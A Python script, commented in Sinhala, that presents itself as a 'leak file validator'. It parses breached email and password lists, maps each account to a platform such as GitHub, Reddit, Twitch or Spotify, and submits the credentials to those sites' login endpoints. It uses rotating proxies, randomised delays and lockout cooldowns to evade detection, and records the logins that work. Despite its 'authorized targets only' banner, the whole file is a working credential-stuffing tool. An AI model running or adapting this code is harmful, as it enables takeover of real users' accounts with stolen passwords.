#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Data Beach v1.0 — Leak File Validator
=====================================
- data/ folder එකේ තියෙන txt files ලිස්ට් කරනවා
- ඕන file එකක් select කරාම:
    * format එක auto-detect (email:pass / user|pass / ; tab ...)
    * platform එක auto-detect (filename keyword / email domain / defaults)
    * ඒ platform එකේ policy එකට ගරු කරමින් දැනටත් වැඩ කරන
      (valid) credentials පමණක් පෙන්නනවා
- Use කරන්න authorize කරපු targets / lab වල පමණයි.

Usage:
    python databeach.py
    python databeach.py --file data/beach.txt
    python databeach.py --file leak.txt --platform github
    python databeach.py --file leak.txt --limit 500
    python databeach.py --file leak.txt --proxy-file proxies.txt
"""

import argparse
import glob
import json
import os
import random
import re
import sys
import time

import requests

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
TOKEN_DIR = os.path.join(BASE_DIR, "tokens")
RESULTS_DIR = os.path.join(BASE_DIR, "results")
CONFIG = os.path.join(BASE_DIR, "platforms.json")
VALID_FILE = os.path.join(RESULTS_DIR, "valid.txt")

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

C = {"R": "\033[91m", "G": "\033[92m", "Y": "\033[93m", "C": "\033[96m",
     "B": "\033[94m", "M": "\033[95m", "0": "\033[0m", "BOLD": "\033[1m"}

BANNER = r"""
{0}{1}  ____        _          ____            _
{0}{1} |  _ \  __ _| |_ __ _  | __ )  __ _ ___| |__   ___
{0}{1} | | | |/ _` | __/ _` | |  _ \ / _` / __| '_ \ / __|
{0}{1} | |_| | (_| | || (_| | | |_) | (_| \__ \ | | | (__|
{0}{1} |____/ \__,_|\__\__,_| |____/ \__,_|___/_| |_|\___|
{0}{2}      Leak File Validator  |  authorized targets only
{0}""".format(C["0"], C["R"], C["Y"])

# ---------------------------------------------------------------------------
# Email domain -> platform
# ---------------------------------------------------------------------------
DOMAIN_PLATFORM = {
    "gmail.com": "google", "googlemail.com": "google",
    "outlook.com": "microsoft", "hotmail.com": "microsoft",
    "live.com": "microsoft", "msn.com": "microsoft",
    "yahoo.com": "yahoo", "icloud.com": "apple",
    "proton.me": "proton", "protonmail.com": "proton", "aol.com": "aol",
    "github.com": "github", "gitlab.com": "gitlab",
    "reddit.com": "reddit", "twitch.tv": "twitch",
    "spotify.com": "spotify", "epicgames.com": "epicgames",
    "linkedin.com": "linkedin", "medium.com": "medium",
    "tumblr.com": "tumblr", "instagram.com": "instagram",
    "facebook.com": "facebook", "x.com": "x", "twitter.com": "x",
}

# මේවාට public login check endpoint එකක් නැහැ -> "unsupported" කියලා skip
UNSUPPORTED_MAIL = {
    "gmail.com", "googlemail.com", "outlook.com", "hotmail.com", "live.com",
    "msn.com", "yahoo.com", "icloud.com", "proton.me", "protonmail.com",
    "aol.com", "google", "microsoft", "yahoo", "apple", "proton", "aol",
}

# Unknown domain / username combos -> මේ platforms වල check කරනවා
DEFAULT_PLATFORMS = ["github", "gitlab", "reddit", "twitch", "epicgames", "spotify"]

# filename keyword -> platform  (leak file එකේ නමෙන් හොයාගන්න)
FILENAME_HINTS = {
    "instagram": "instagram", "fb": "facebook", "facebook": "facebook",
    "twitter": "x", "x.com": "x", "tiktok": "tiktok", "snapchat": "snapchat",
    "linkedin": "linkedin", "github": "github", "gitlab": "gitlab",
    "reddit": "reddit", "twitch": "twitch", "spotify": "spotify",
    "epic": "epicgames", "steam": "steam", "tumblr": "tumblr",
    "medium": "medium", "gmail": "google", "yahoo": "yahoo",
    "hotmail": "microsoft", "outlook": "microsoft", "combo": None,
}


def clear():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except Exception:
        pass


def p(msg, color=C["0"]):
    print(f"{color}{msg}{C['0']}", flush=True)


def load_platforms():
    with open(CONFIG, encoding="utf-8") as fh:
        return json.load(fh)


# ---------------------------------------------------------------------------
# File list / parsing
# ---------------------------------------------------------------------------

def list_data_files():
    files = sorted(glob.glob(os.path.join(DATA_DIR, "*.txt")))
    files += sorted(glob.glob(os.path.join(DATA_DIR, "*.lst")))
    return files


def parse_combo(line):
    """ඕනම breach file format එකකින් user:pass pair එකක් ගන්නවා."""
    line = line.strip().strip('"').strip("'")
    if not line or line.startswith("#") or line.startswith("//"):
        return None
    # format candidates: : | ; tab , space
    for sep in (":", "|", ";", "\t", ",", " "):
        if sep in line:
            parts = [x.strip() for x in line.split(sep) if x.strip()]
            if len(parts) >= 2:
                user, pw = parts[0], parts[1]
                if len(user) >= 2 and pw:
                    return user, pw
    return None


def detect_file_platform(filename):
    """File නමෙන් platform එක හොයනවා."""
    base = os.path.basename(filename).lower()
    for key, plat in FILENAME_HINTS.items():
        if key in base and plat:
            return plat
    return None


def detect_candidates(platforms, user, file_plat):
    """Combo එකට අදාල platform candidates ලිස්ට් එක."""
    if file_plat:
        return [file_plat] if file_plat in platforms else []
    low = user.lower().strip()
    if "@" in low:
        domain = low.rsplit("@", 1)[1]
        plat = DOMAIN_PLATFORM.get(domain)
        if plat in UNSUPPORTED_MAIL:
            return [], "unsupported"
        if plat and plat in platforms:
            return [plat], "mapped"
        return list(DEFAULT_PLATFORMS), "unknown"
    return list(DEFAULT_PLATFORMS), "username"


# ---------------------------------------------------------------------------
# Rate limiter / token / attempt
# ---------------------------------------------------------------------------

class RateLimiter:
    def __init__(self, rate, fast=False):
        self.max_per_minute = rate.get("max_per_minute", 30)
        self.d_min = 0.1 if fast else rate.get("delay_min", 1.0)
        self.d_max = 0.3 if fast else rate.get("delay_max", 3.0)
        self._win = []

    def wait(self):
        now = time.time()
        self._win = [t for t in self._win if now - t < 60.0]
        if len(self._win) >= self.max_per_minute:
            need = 60.0 - (now - self._win[0]) + random.uniform(0.5, 2.0)
            time.sleep(max(0.0, need))
        time.sleep(random.uniform(self.d_min, self.d_max))
        self._win.append(time.time())


def setup_tokens(session, name, login):
    tfile = os.path.join(TOKEN_DIR, f"{name}.json")
    if os.path.exists(tfile):
        try:
            data = json.load(open(tfile, encoding="utf-8"))
            return {"headers": data.get("headers", {}),
                    "cookies": data.get("cookies", {}),
                    "token": data.get("token", "")}
        except Exception:
            pass
    ts = login.get("token_source")
    if ts:
        try:
            r = session.get(ts["url"], timeout=20, headers={"User-Agent": DEFAULT_UA})
            m = re.search(ts["regex"], r.text, re.I)
            if m:
                return {"headers": {}, "cookies": {}, "token": m.group(1)}
        except Exception:
            pass
    p(f"  [!] {name}: token ඕන -> tokens/{name}.json හදන්න "
      '{"token": "...", "headers": {}, "cookies": {}}', C["Y"])
    return None


def attempt(session, login, user, pw, tokens, proxies):
    payload = {}
    for k, v in login.get("payload", {}).items():
        payload[k] = (str(v).replace("{ID}", user).replace("{PASS}", pw)
                      .replace("{TOKEN}", tokens.get("token", "")))
    headers = {"User-Agent": DEFAULT_UA}
    headers.update(login.get("headers", {}))
    headers.update(tokens.get("headers", {}))
    proxy = None
    if proxies:
        proxy = {"http": random.choice(proxies), "https": random.choice(proxies)}
    try:
        if login.get("method", "POST").upper() == "POST":
            r = session.post(login["url"], data=payload, headers=headers,
                             proxies=proxy, timeout=25, allow_redirects=False)
        else:
            r = session.get(login["url"], params=payload, headers=headers,
                            proxies=proxy, timeout=25, allow_redirects=False)
    except requests.RequestException as exc:
        return "error:" + str(exc)[:50]
    body = r.text.lower()
    loc = (r.headers.get("Location") or "").lower()
    if any(m in body for m in login.get("lockout_markers", [])):
        return "lockout"
    if any(m in body for m in login.get("success_markers", [])):
        return "success"
    if login.get("success_redirects") and r.is_redirect \
            and any(m in loc for m in login["success_redirects"]):
        return "success"
    if any(m in body for m in login.get("failure_markers", [])):
        return "fail"
    return "unknown"


# ---------------------------------------------------------------------------
# Checker
# ---------------------------------------------------------------------------

def check_combo(session, platforms, tcache, limiters, plat_key, user, pw, proxies, fast):
    plat = platforms.get(plat_key)
    if not plat or not plat.get("login"):
        return "no-login"
    login = plat["login"]
    if login.get("requires_token"):
        if plat_key not in tcache:
            tcache[plat_key] = setup_tokens(session, plat_key, login)
        tokens = tcache[plat_key]
        if tokens is None:
            return "no-token"
    else:
        tokens = {"headers": {}, "cookies": {}, "token": ""}
    if plat_key not in limiters:
        limiters[plat_key] = RateLimiter(login.get("rate", {}), fast=fast)
    limiters[plat_key].wait()
    return attempt(session, login, user, pw, tokens, proxies)


# FIX: run_file() function signature එකට detect_fn parameter එක එකතු කළා
def run_file(session, platforms, path, args, detect_fn=None):
    file_plat = detect_file_platform(path)
    total = 0
    combos = []
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            c = parse_combo(line)
            if c:
                combos.append(c)
                total += 1
    if args.limit:
        combos = combos[:args.limit]

    p(f"\n[*] File        : {path}", C["B"])
    p(f"[*] Combos      : {total} (checked: {len(combos)})", C["B"])
    p(f"[*] File hint   : {file_plat or 'none (per-combo auto-detect)'}", C["B"])

    if not combos:
        p("[!] Valid combos නැහැ. Format: email:password හෝ user:password", C["R"])
        return

    proxies = []
    if args.proxy_file:
        with open(args.proxy_file, encoding="utf-8") as fh:
            proxies = [ln.strip() for ln in fh if ln.strip()]
        p(f"[*] Proxies     : {len(proxies)}", C["B"])

    tcache, limiters = {}, {}
    stats = {"valid": 0, "fail": 0, "unsupported": 0, "lockout": 0,
             "no_token": 0, "error": 0, "checked": 0}
    valid = []
    started = time.time()

    # FIX: detect_fn parameter එක use කරන්න (default එක detect_candidates)
    if detect_fn is None:
        detect_fn = detect_candidates

    try:
        for i, (user, pw) in enumerate(combos, 1):
            cands, how = detect_fn(platforms, user, file_plat)   # <-- FIX: මෙතැන detect_fn call කරනවා
            if not cands and how == "unsupported":
                stats["unsupported"] += 1
                print(f"  [{i:>6}/{len(combos)}] {user[:34]:<34} -> "
                      f"unsupported mail provider (skip)", flush=True)
                continue
            if not cands:
                stats["unsupported"] += 1
                print(f"  [{i:>6}/{len(combos)}] {user[:34]:<34} -> "
                      f"no platform (skip)", flush=True)
                continue

            hit = None
            for pk in cands:
                v = check_combo(session, platforms, tcache, limiters,
                                pk, user, pw, proxies, args.fast)
                stats["checked"] += 1
                if v == "success":
                    hit = pk
                    break
                if v == "lockout":
                    stats["lockout"] += 1
                    p(f"  [!] {pk}: lockout detected — cooldown", C["Y"])
                    cd = platforms[pk]["login"].get("rate", {}).get("cooldown_seconds", 300)
                    time.sleep(cd)
                elif v.startswith("error"):
                    stats["error"] += 1
                    time.sleep(5)
                elif v == "no-token":
                    stats["no_token"] += 1
                    break
            if hit:
                stats["valid"] += 1
                valid.append((user, pw, hit))
                p(f"  [{i:>6}/{len(combos)}] {user[:34]:<34} -> "
                  f"[++] VALID on {hit}  (pw: {pw[:20]})", C["G"])
                os.makedirs(RESULTS_DIR, exist_ok=True)
                with open(VALID_FILE, "a", encoding="utf-8") as fh:
                    fh.write(f"{hit}:{user}:{pw}\n")
                with open(os.path.join(RESULTS_DIR,
                                       "valid_" + os.path.basename(path)),
                          "a", encoding="utf-8") as fh:
                    fh.write(f"{user}:{pw}\n")
            else:
                stats["fail"] += 1
                print(f"  [{i:>6}/{len(combos)}] {user[:34]:<34} -> "
                      f"invalid (checked: {', '.join(cands)})", flush=True)
    except KeyboardInterrupt:
        p("\n[!] Stopped by user.", C["Y"])

    elapsed = time.time() - started
    p("\n" + "-" * 62, C["C"])
    p(f"[*] Summary ({elapsed:.0f}s)", C["BOLD"])
    p(f"    VALID      : {stats['valid']}", C["G"] if stats['valid'] else C["0"])
    p(f"    Invalid    : {stats['fail']}")
    p(f"    Unsupported: {stats['unsupported']}")
    p(f"    No-token   : {stats['no_token']}")
    p(f"    Lockouts   : {stats['lockout']}", C["Y"])
    p(f"    Errors     : {stats['error']}", C["R"])
    if valid:
        p(f"\n[+] Valid list save වුණා -> results/valid.txt", C["G"])
        p("    Valid combos:", C["BOLD"])
        for u, pw, pk in valid:
            p(f"      {pk:<10} {u}:{pw}", C["G"])


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="Data Beach - Leak File Validator")
    ap.add_argument("--file", help="check specific file (skip menu)")
    ap.add_argument("--platform", help="force platform for all combos")
    ap.add_argument("--limit", type=int, default=0, help="check first N combos")
    ap.add_argument("--proxy-file", help="proxy list (one per line)")
    ap.add_argument("--fast", action="store_true", help="reduce delays (lab only)")
    ap.add_argument("--no-banner", action="store_true")
    args = ap.parse_args()

    platforms = load_platforms()

    if not args.no_banner:
        clear()
        print(BANNER)
        crackable = [k for k, v in platforms.items() if v.get("login")]
        p(f"[*] Check-capable platforms: {len(crackable)}", C["C"])
        p("    " + ", ".join(sorted(crackable)), C["C"])
        print()

    # file selection
    path = args.file
    if not path:
        files = list_data_files()
        if not files:
            p("[!] data/ folder එකේ txt files නැහැ.", C["R"])
            p("    beach.txt / dkxx.txt / dtbch.txt / onbeach.txt දාලා නැවත run කරන්න.", C["Y"])
            sys.exit(1)
        p("[#] data/ folder එකේ තියෙන files:", C["BOLD"])
        for i, f in enumerate(files, 1):
            try:
                sz = os.path.getsize(f) / 1024
            except OSError:
                sz = 0
            hint = detect_file_platform(f) or "-"
            p(f"    [{i:>2}] {os.path.basename(f):<28} ({sz:,.0f} KB) "
              f"hint: {hint}", C["C"])
        try:
            sel = input(f"{C['C']}[?]{C['0']} කොයි file එක check කරන්නද "
                        f"(number / all / path): ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            p("\nBye.", C["Y"])
            return
        if not sel:
            return
        if sel == "all":
            # FIX: detect_fn එක හදලා run_file call එකට pass කරන්න
            forced = args.platform
            def detect_fn(platforms, user, file_plat):
                if forced:
                    return [forced], "forced"
                return detect_candidates(platforms, user, file_plat)
            for f in files:
                run_file(requests.Session(), platforms, f, args, detect_fn)
                input(f"{C['C']}[?]{C['0']} Press Enter ...")
            return
        if sel.isdigit() and 1 <= int(sel) <= len(files):
            path = files[int(sel) - 1]
        else:
            path = sel

    if not os.path.exists(path):
        p(f"[!] File නැහැ: {path}", C["R"])
        sys.exit(1)

    # FIX: --platform force එක detect_fn හරහා pass කරනවා
    if args.platform and args.platform not in platforms:
        p(f"[!] Unknown platform: {args.platform}", C["R"])
        sys.exit(1)

    forced = args.platform

    def detect_fn(platforms, user, file_plat):
        if forced:
            return [forced], "forced"
        return detect_candidates(platforms, user, file_plat)

    session = requests.Session()
    session.headers["User-Agent"] = DEFAULT_UA
    run_file(session, platforms, path, args, detect_fn)   # <-- FIX: detect_fn pass කරනවා


if __name__ == "__main__":
    main()
